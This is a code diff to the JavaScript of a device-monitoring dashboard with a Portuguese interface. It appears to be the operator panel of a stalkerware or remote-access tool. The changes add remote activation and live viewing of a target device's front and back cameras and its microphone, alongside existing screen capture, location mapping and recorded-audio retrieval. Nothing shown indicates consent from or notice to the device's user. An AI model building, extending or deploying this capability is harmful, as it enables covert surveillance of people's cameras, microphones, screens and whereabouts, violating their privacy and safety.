@@ -8,8 +8,17 @@ let dayMarkers = [];
 let currentDeviceId = null;
 let devicesMap = new Map();
 let isScreenStreaming = false;
+let isCameraStreaming = false;
+let activeCameraType = null; // 'front' | 'back'
+let isAudioStreaming = false;
 let currentStreamObjectUrl = null;
-let sentAudioLog = []; // in-memory list of RECORD_AUDIO commands sent this session
+let currentCamObjectUrl = null;
+let sentAudioLog = [];
+
+// Web Audio API for live PCM streaming
+let audioCtx = null;
+let audioNextTime = 0;
+const AUDIO_SAMPLE_RATE = 16000;
 
 // Premium custom cyber-dark theme styling for Google Maps (neon style matching our dashboard)
 const darkMapStyle = [
@@ -207,8 +216,7 @@ function connectWebSocket() {
     
     socket.onmessage = (event) => {
         if (event.data instanceof ArrayBuffer) {
-            // Binary frame! It is the live screen capture frame (JPEG)
-            handleScreenFrame(event.data);
+            handleBinaryFrame(event.data);
         } else {
             // Text frame (JSON event)
             try {
@@ -286,27 +294,158 @@ function handleJsonMessage(data) {
     }
 }
 
+// Route binary frames by first byte (type byte)
+// 0x01 = screen JPEG | 0x02 = front cam JPEG | 0x03 = back cam JPEG | 0x04 = audio PCM
+// legacy (no prefix, raw JPEG) = screen
+function handleBinaryFrame(arrayBuffer) {
+    const view = new Uint8Array(arrayBuffer);
+    const type = view[0];
+
+    // Legacy raw JPEG (no prefix): first byte of JPEG is 0xFF = 255
+    if (type === 255 || type > 10) {
+        handleScreenFrame(arrayBuffer);
+        return;
+    }
+
+    const payload = arrayBuffer.slice(1);
+    switch (type) {
+        case 1: handleScreenFrame(payload); break;
+        case 2: handleCameraFrame(payload, 'front'); break;
+        case 3: handleCameraFrame(payload, 'back');  break;
+        case 4: handleAudioPcmChunk(payload);        break;
+        default: handleScreenFrame(arrayBuffer);
+    }
+}
+
 // Handle Screen JPEG frames
 function handleScreenFrame(arrayBuffer) {
     if (!isScreenStreaming || !currentDeviceId) return;
-    
-    // Convert ArrayBuffer to Blob image
+
     const blob = new Blob([arrayBuffer], { type: 'image/jpeg' });
-    const url = URL.createObjectURL(blob);
-    
-    // Update image src
-    const imgElement = document.getElementById('screen-stream-img');
-    const placeholder = document.getElementById('screen-placeholder');
-    
-    imgElement.src = url;
-    imgElement.style.display = 'block';
-    placeholder.style.display = 'none';
-    
-    // Revoke previous url to avoid memory leaks
-    if (currentStreamObjectUrl) {
-        URL.revokeObjectURL(currentStreamObjectUrl);
-    }
+    const url  = URL.createObjectURL(blob);
+
+    const img = document.getElementById('screen-stream-img');
+    const ph  = document.getElementById('screen-placeholder');
+    img.src = url;
+    img.style.display = 'block';
+    ph.style.display  = 'none';
+
+    if (currentStreamObjectUrl) URL.revokeObjectURL(currentStreamObjectUrl);
     currentStreamObjectUrl = url;
+}
+
+// Handle live camera JPEG frames
+function handleCameraFrame(arrayBuffer, camType) {
+    if (!isCameraStreaming || activeCameraType !== camType) return;
+
+    const blob = new Blob([arrayBuffer], { type: 'image/jpeg' });
+    const url  = URL.createObjectURL(blob);
+
+    const img = document.getElementById('cam-stream-img');
+    const ph  = document.getElementById('cam-placeholder');
+    if (img) { img.src = url; img.style.display = 'block'; }
+    if (ph)  ph.style.display = 'none';
+
+    if (currentCamObjectUrl) URL.revokeObjectURL(currentCamObjectUrl);
+    currentCamObjectUrl = url;
+}
+
+// Handle live PCM audio chunks (Int16, 16kHz, mono)
+function handleAudioPcmChunk(arrayBuffer) {
+    if (!isAudioStreaming) return;
+    if (!audioCtx) {
+        audioCtx = new (window.AudioContext || window.webkitAudioContext)({ sampleRate: AUDIO_SAMPLE_RATE });
+        audioNextTime = audioCtx.currentTime + 0.1;
+    }
+    if (audioCtx.state === 'suspended') audioCtx.resume();
+
+    const int16 = new Int16Array(arrayBuffer);
+    const float32 = new Float32Array(int16.length);
+    for (let i = 0; i < int16.length; i++) float32[i] = int16[i] / 32768.0;
+
+    const buffer = audioCtx.createBuffer(1, float32.length, AUDIO_SAMPLE_RATE);
+    buffer.copyToChannel(float32, 0);
+
+    const src = audioCtx.createBufferSource();
+    src.buffer = buffer;
+    src.connect(audioCtx.destination);
+
+    const now = audioCtx.currentTime;
+    const start = Math.max(audioNextTime, now);
+    src.start(start);
+    audioNextTime = start + buffer.duration;
+}
+
+// Toggle camera stream on/off
+function toggleCameraStream(cam) {
+    if (!currentDeviceId) { logToConsole('Nenhum dispositivo selecionado!', 'error'); return; }
+
+    if (isCameraStreaming && activeCameraType === cam) {
+        // Stop
+        sendCommand('STOP_CAMERA_STREAM');
+        stopLocalCameraUI();
+    } else {
+        if (isCameraStreaming) sendCommand('STOP_CAMERA_STREAM');
+        sendCommand('START_CAMERA_STREAM', { camera: cam });
+        isCameraStreaming = true;
+        activeCameraType  = cam;
+
+        const badge     = document.getElementById('cam-active-badge');
+        const badgeLbl  = document.getElementById('cam-badge-label');
+        if (badge)    badge.style.display = 'inline-block';
+        if (badgeLbl) badgeLbl.textContent = cam === 'front' ? 'FRONTAL' : 'TRASEIRA';
+
+        const frontTxt = document.getElementById('btn-cam-front-txt');
+        const backTxt  = document.getElementById('btn-cam-back-txt');
+        if (cam === 'front' && frontTxt) frontTxt.textContent = '⏹ Parar Frontal';
+        if (cam === 'back'  && backTxt)  backTxt.textContent  = '⏹ Parar Traseira';
+    }
+}
+
+function stopLocalCameraUI() {
+    isCameraStreaming = false;
+    activeCameraType  = null;
+
+    const img = document.getElementById('cam-stream-img');
+    const ph  = document.getElementById('cam-placeholder');
+    if (img) { img.src = ''; img.style.display = 'none'; }
+    if (ph)  ph.style.display = 'flex';
+
+    const badge = document.getElementById('cam-active-badge');
+    if (badge) badge.style.display = 'none';
+
+    const frontTxt = document.getElementById('btn-cam-front-txt');
+    const backTxt  = document.getElementById('btn-cam-back-txt');
+    if (frontTxt) frontTxt.textContent = 'Câmera Frontal Live';
+    if (backTxt)  backTxt.textContent  = 'Câmera Traseira Live';
+
+    if (currentCamObjectUrl) { URL.revokeObjectURL(currentCamObjectUrl); currentCamObjectUrl = null; }
+}
+
+// Toggle live audio stream on/off
+function toggleAudioStream() {
+    if (!currentDeviceId) { logToConsole('Nenhum dispositivo selecionado!', 'error'); return; }
+
+    if (isAudioStreaming) {
+        sendCommand('STOP_AUDIO_STREAM');
+        isAudioStreaming = false;
+        if (audioCtx) { audioCtx.close(); audioCtx = null; }
+        const icon = document.getElementById('btn-audio-live-icon');
+        const txt  = document.getElementById('btn-audio-live-txt');
+        if (icon) icon.className = 'fa-solid fa-headphones';
+        if (txt)  txt.textContent = 'Ouvir Ao Vivo';
+        const badge = document.getElementById('cam-audio-badge');
+        if (badge) badge.style.display = 'none';
+    } else {
+        sendCommand('START_AUDIO_STREAM');
+        isAudioStreaming = true;
+        const icon = document.getElementById('btn-audio-live-icon');
+        const txt  = document.getElementById('btn-audio-live-txt');
+        if (icon) icon.className = 'fa-solid fa-headphones fa-beat';
+        if (txt)  txt.textContent = '⏹ Parar Áudio Live';
+        const badge = document.getElementById('cam-audio-badge');
+        if (badge) badge.style.display = 'inline-block';
+    }
 }
 
 // Handle Device List updates
@@ -366,6 +505,8 @@ function selectDevice(deviceId) {
         updateActiveDeviceUI(device);
         fetchMediaList(deviceId);
         stopLocalScreenUI();
+        stopLocalCameraUI();
+        if (isAudioStreaming) toggleAudioStream();
         fetchDeviceHistory(deviceId);
     }
 
@@ -799,16 +940,30 @@ function renderAudios(deviceId, audios) {
                 </div>
             </div>
             <div class="audio-player-control">
-                <audio controls preload="none">
+                <audio controls preload="metadata">
                     <source src="${fileUrl}" type="audio/aac">
                     <source src="${fileUrl}" type="audio/mp4">
+                    <source src="${fileUrl}" type="audio/mpeg">
                 </audio>
             </div>
         `;
 
         const audioEl = audioDiv.querySelector('audio');
-        audioEl.addEventListener('error', () => {
-            audioEl.parentElement.innerHTML = `<a href="${fileUrl}" target="_blank" download class="audio-download-link"><i class="fa-solid fa-download"></i> Baixar Áudio</a>`;
+        audioEl.addEventListener('error', async () => {
+            // Fallback: fetch as blob so browser can play from memory (bypasses CORS/redirect issues)
+            try {
+                const resp = await fetch(fileUrl, { headers: authHeaders() });
+                if (resp.ok) {
+                    const blob = await resp.blob();
+                    const blobUrl = URL.createObjectURL(blob);
+                    audioEl.src = blobUrl;
+                    audioEl.load();
+                } else {
+                    audioEl.parentElement.innerHTML = `<a href="${fileUrl}" target="_blank" download class="audio-download-link"><i class="fa-solid fa-download"></i> Baixar Áudio</a>`;
+                }
+            } catch {
+                audioEl.parentElement.innerHTML = `<a href="${fileUrl}" target="_blank" download class="audio-download-link"><i class="fa-solid fa-download"></i> Baixar Áudio</a>`;
+            }
         });
 
         audioList.appendChild(audioDiv);
